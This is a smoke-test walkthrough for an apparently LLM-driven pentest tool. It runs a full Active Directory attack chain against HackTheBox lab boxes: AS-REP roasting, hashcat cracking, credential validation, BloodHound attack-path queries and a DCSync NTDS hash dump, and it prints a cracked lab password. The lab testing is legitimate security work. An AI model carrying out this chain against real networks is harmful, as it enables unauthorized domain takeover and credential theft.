# Manual smoke test — Active Directory engagement (~30 min)

This walkthrough exercises the full AD capability stack (Plans 1–5) end-to-end against a
known-stable HackTheBox AD lab box. **Do not skip this before declaring the AD feature
complete.** Each numbered step lists the command the LLM should issue and the expected KB
state immediately after — verify both before moving on.

**Recommended boxes (any of):**
- HTB Forest — easiest; AS-REP roastable user, kerberoastable svc account
- HTB Sauna — easy; AS-REP roastable user, AutoLogon credentials in registry
- HTB Active — easy; readable Groups.xml on SYSVOL with cpassword

**Prerequisites (do these BEFORE Step 1):**
- VPN connected; lab box pingable.
- `REVERSER_PENTEST_AUTHORIZED=1` exported in shell.
- `REVERSER_AD_ALLOW_SPRAY=1` exported (only needed for Step 3 if you choose to test spray).
- `direnv` reloaded so `nxc`, `neo4j`, and `bloodhound-python` resolve on PATH.
- Working directory at the repo root (so `targets/` is created here).

---

## Step 1 — Launch reverser with the `ad` profile

Command:
```sh
REVERSER_PENTEST_AUTHORIZED=1 reverser i -p ad <BOX_IP>
```

Expected:
- TUI opens with "Active Directory" profile selected (top bar).
- F1 menu lists 11 AD skills.
- The system prompt section shown via `?` mentions "assumed-breach", "hypothesis-driven loop",
  and the new tool surface (`netexec_*`, `bloodhound_*`, `kb_*`).

KB state: empty (no `targets/<BOX_IP>/` directory yet).

---

## Step 2 — Initial recon

Trigger: F1 → "Initial recon" (or type the prompt manually).

Expected tool calls (in parallel where possible):
- `nmap_scan` with version detection on top-1000 TCP ports.
- `smb_enum` for shares + SMB security mode.
- `ldap_search` with anonymous bind for the root DSE.
- `nbtscan_scan` for NetBIOS names.

KB state after:
- `targets/<BOX_IP>/state.db` exists.
- `kb_list_hosts` returns at least one host (the box IP).
- `kb_list_services` returns at least: 53/tcp (DNS), 88/tcp (Kerberos), 135/tcp (RPC),
  139/tcp (NetBIOS), 389/tcp (LDAP), 445/tcp (SMB), 464/tcp (kpasswd), 593/tcp (RPC over HTTP),
  636/tcp (LDAPS), 3268/tcp (Global Catalog), 3269/tcp (LDAPS GC).
- `targets/<BOX_IP>/state.db` has a populated `services` table; `kb_show` renders without errors.

Verification:
```sh
sqlite3 targets/<BOX_IP>/state.db "SELECT host_ip, port, service FROM services ORDER BY port"
```

---

## Step 3 — Identify the Domain Controller and domain name

Trigger: F1 → "Identify DCs".

Expected tool calls:
- `kerberos_enum` action=`userenum` (uses nmap krb5-enum-users).
- `ldap_search` filter `(objectClass=domainDNS)` and the SERVER_TRUST_ACCOUNT bit-test filter.

KB state after:
- The host now has `is_dc=1` in the `hosts` table.
- The `targets` table has the discovered domain in the `domain` column (or a note records it).
- `kb_list_hosts` shows is_dc=True.

Verification:
```sh
sqlite3 targets/<BOX_IP>/state.db "SELECT ip, hostname, os, domain, is_dc FROM hosts"
```

If `is_dc` is still 0 here, the LDAP parser missed the SERVER_TRUST_ACCOUNT flag — file a bug.

---

## Step 4 — AS-REP roast

Trigger: F1 → "AS-REP roast".

Expected tool calls:
- `ldap_search` with the DONT_REQ_PREAUTH filter to harvest a userlist (anon LDAP only).
- `kerberos_enum` action=`asreproast` against the DC, supplying the userlist.

KB state after:
- For each AS-REP-roastable user, a row appears in the `credentials` table with:
  - `username` set
  - `kerberos_ticket` populated (the `$krb5asrep$23$...` blob)
  - `status = 'untested'`
  - `source_tool = 'kerberos_enum'`
- An entry in the `artifacts` table with `kind = 'asreproast_hashes'` pointing at a file
  under `targets/<BOX_IP>/loot/`.

Verification:
```sh
sqlite3 targets/<BOX_IP>/state.db \
  "SELECT username, substr(kerberos_ticket, 1, 30), status FROM credentials WHERE kerberos_ticket IS NOT NULL"
sqlite3 targets/<BOX_IP>/state.db "SELECT kind, path FROM artifacts"
```

For HTB Forest, you should see at least `svc-alfresco`. For Sauna, `fsmith` (after manual user
discovery from the website).

---

## Step 5 — Crack the AS-REP hashes (manual; outside the agent)

This step is OUT OF SCOPE for the LLM. Drop to your own shell.

```sh
hashcat -m 18200 targets/<BOX_IP>/loot/asreproast_hashes.txt /usr/share/wordlists/rockyou.txt
```

Expected: at least one hash cracks (HTB Forest: `svc-alfresco:s3rvice`).

After cracking, manually record the cleartext into the KB so subsequent steps see it:

```sh
sqlite3 targets/<BOX_IP>/state.db <<SQL
UPDATE credentials
SET password = 's3rvice', status = 'untested'
WHERE username = 'svc-alfresco' AND kerberos_ticket IS NOT NULL;
SQL
```

(In a future plan we will surface a `kb_set_password` helper. For now, this manual
update is the smoke-test compromise.)

KB state after:
- `kb_list_creds` shows the cracked cred with `password` set and `status='untested'`.

---

## Step 6 — Validate the cracked cred against SMB

Trigger: tell the LLM "We cracked `svc-alfresco:s3rvice` — validate it everywhere."

Expected tool call:
- `netexec_smb` action=`check_auth` username=`svc-alfresco` password=`s3rvice` on the box IP.
- Followed by `netexec_winrm`, `netexec_ldap` check_auth in parallel.

KB state after:
- `credentials.status = 'valid'` for `svc-alfresco`.
- `cred_results` has at least one row with `success=1` for the working service.

Verification:
```sh
sqlite3 targets/<BOX_IP>/state.db \
  "SELECT c.username, cr.service_kind, cr.target_host, cr.success
   FROM credentials c JOIN cred_results cr ON c.id = cr.cred_id"
```

---

## Step 7 — Start BloodHound and collect

Trigger: F1 → "Collect BloodHound".

Expected tool calls (sequential):
- `bloodhound_start(target=<BOX_IP>)` — spins up Neo4j on bolt port 7687 with data dir
  at `targets/<BOX_IP>/neo4j/`.
- `bloodhound_collect(target=<BOX_IP>, domain=<DOMAIN>, dc_ip=<BOX_IP>,
   username='svc-alfresco', password='s3rvice', collection_methods='Default,LoggedOn')`
- `bloodhound_status(target=<BOX_IP>)` — reports node counts.

Expected output of `bloodhound_status`:
- Users: ≥10
- Computers: ≥1
- Groups: ≥10
- OUs: ≥1

KB state after:
- `targets/<BOX_IP>/neo4j/` directory populated with a `data/` subdir.
- A note in the `notes` table recording the imported counts.

Verification:
```sh
ls targets/<BOX_IP>/neo4j/data/
sqlite3 targets/<BOX_IP>/state.db "SELECT body FROM notes ORDER BY id DESC LIMIT 1"
```

---

## Step 8 — Find the shortest path to Domain Admin

Trigger: F1 → "Find attack paths".

Expected tool calls:
- `bloodhound_canned(target=<BOX_IP>, query_name='shortest_path_to_da')`
- `bloodhound_canned(target=<BOX_IP>, query_name='owned_to_high_value', params={'username': 'SVC-ALFRESCO@<DOMAIN>'})`
- `bloodhound_canned(target=<BOX_IP>, query_name='kerberoastable_users')`

For HTB Forest, the canned `shortest_path_to_da` query should reveal the
`Account Operators → Exchange Windows Permissions → DCSync` path.

KB state after:
- A `notes` entry recording the discovered path (LLM should call `kb_add_note` with the result).

Verification:
```sh
sqlite3 targets/<BOX_IP>/state.db "SELECT body FROM notes WHERE body LIKE '%path%' OR body LIKE '%DCSync%'"
```

---

## Step 9 — Validate via LDAP from the same cred

Trigger: tell the LLM "Confirm the cred works against LDAP and dump the user list."

Expected tool calls:
- `netexec_ldap` action=`check_auth`, then action=`users` (or action=`active_users`).

KB state after:
- `cred_results` has a `service_kind='ldap'` row with `success=1`.
- New host rows are recorded for any computers discovered via LDAP enumeration.

---

## Step 10 — (HTB Forest specific) Dump NTDS via DCSync

This step depends on the box. If your chosen box does not have a DCSync path from the
foothold cred, skip and document why.

Trigger: tell the LLM "We have DCSync rights — dump NTDS."

Expected tool call:
- `netexec_smb` action=`ntds` username=… password=… on the DC IP.

KB state after:
- An `artifacts` row with `kind='ntds_dump'` pointing at a file under
  `targets/<BOX_IP>/loot/`.
- Per-extracted credential rows in `credentials` with `nt_hash` populated and
  `status='untested'`.

Verification:
```sh
sqlite3 targets/<BOX_IP>/state.db "SELECT kind, path FROM artifacts WHERE kind = 'ntds_dump'"
sqlite3 targets/<BOX_IP>/state.db \
  "SELECT username, substr(nt_hash, 1, 12) FROM credentials WHERE nt_hash IS NOT NULL LIMIT 10"
```
